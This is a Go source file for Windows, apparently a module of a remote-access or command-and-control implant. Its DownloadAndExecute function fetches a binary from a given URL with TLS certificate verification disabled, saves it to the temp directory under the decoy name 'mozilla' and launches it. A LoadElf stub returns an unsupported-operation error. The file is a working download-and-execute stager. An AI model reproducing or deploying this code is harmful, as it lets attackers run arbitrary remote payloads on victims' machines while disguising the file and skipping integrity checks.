//go:build windows

package executable

import (
	"fmt"
	"io"
	"net/http"
	"path/filepath"
	"mime"
	"os"
	"os/exec"
	"errors"
	"crypto/tls"
)

func DownloadAndExecute(url string, path string) error {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: transport}
	resp, err := client.Get(url)
	if err != nil {
		return fmt.Errorf("failed to download binary: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("failed to download binary: received status %s", resp.Status)
	}

	elfData, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read ELF binary: %v", err)
	}
	filename := "mozilla"
	cd := resp.Header.Get("Content-Disposition")
	if cd != "" {
		_, params, err := mime.ParseMediaType(cd)
		if err == nil {
			if fname, ok := params["filename"]; ok {
				filename = fname
			}
		}
	}

	var target string
	if path != "" {
		absPath, err := filepath.Abs(path)
		if err != nil {
			return fmt.Errorf("invalid path %q: %v", path, err)
		}
		dir := filepath.Dir(absPath)
		if info, err := os.Stat(dir); err == nil && info.IsDir() {
			target = absPath
		} else {
			target = filepath.Join(os.TempDir(), filename)
		}
	} else {
		target = filepath.Join(os.TempDir(), filename)
	}
	if err := os.WriteFile(target, elfData, 0755); err != nil {
		return fmt.Errorf("failed to write binary to file: %v", err)
	}

	cmd := exec.Command(target)
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start process: %v", err)
	}
	return nil
}

func LoadElf(elf []byte, binaryPath string) error {
	return errors.New(`${i18n|COMMON.OPERATION_NOT_SUPPORTED}`)
}